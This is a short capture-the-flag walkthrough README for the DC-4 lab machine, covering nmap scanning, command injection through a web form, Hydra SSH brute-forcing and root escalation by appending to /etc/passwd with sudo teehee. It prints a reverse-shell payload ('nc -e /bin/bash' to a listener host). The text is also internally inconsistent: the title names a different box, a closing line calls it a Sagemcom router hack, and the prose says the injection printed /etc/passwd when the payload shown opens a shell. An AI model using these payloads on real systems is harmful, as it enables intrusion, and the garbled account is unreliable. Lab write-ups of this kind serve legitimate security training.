# Anas-EPI-Basic-pentesting-2-walkthrough-



# Walkthrough: Hacking into Machine DC-4


## Initial Reconnaissance

I started with a port scan using nmap to identify open ports on the target:

```bash
nmap -A -sC -sV -p- 192.168.56.105
```

This revealed 2 open ports.

## Exploiting Command Injection

After discovering a correct username and password combination, I captured the request in Burp Suite and attempted a simple command injection attack, successfully printing out the /etc/passwd file:

```bash
radio=ls+-l|nc -e /bin/bash 192.168.56.101 9898&submit=Run
```

A quick wget command allowed me to download the password file:

```bash
wget 192.168.56.105:8000/old-passwords.bak
```

## Password Cracking

To crack the passwords, I created a users.txt file with all three possible usernames and used Hydra for brute-forcing:

```bash
hydra -L ~/Downloads/users.txt -P ~/Downloads/old-passwords.bak ssh://192.168.56.105
```

## Privilege Escalation

Despite finding a shell script with SUID bit set, I couldn't escalate privileges directly. However, further exploration revealed another email with a password, allowing me to escalate privileges.

## Root Access

I discovered that Charles had permissions to execute /usr/bin/teehee as root without a password. Leveraging this, I added a new user with root privileges to /etc/passwd and gained root access.

```bash
sudo teehee -a /etc/passwd
```

## Retrieving the Flag

Finally, I located and printed out the root flag:

```bash
cat flag.txt
```

This concludes the walkthrough of the hacking process.

```

This README provides a clear and structured overview of the steps taken to hack into the Sagemcom router, making it easier for others to understand and replicate the process.
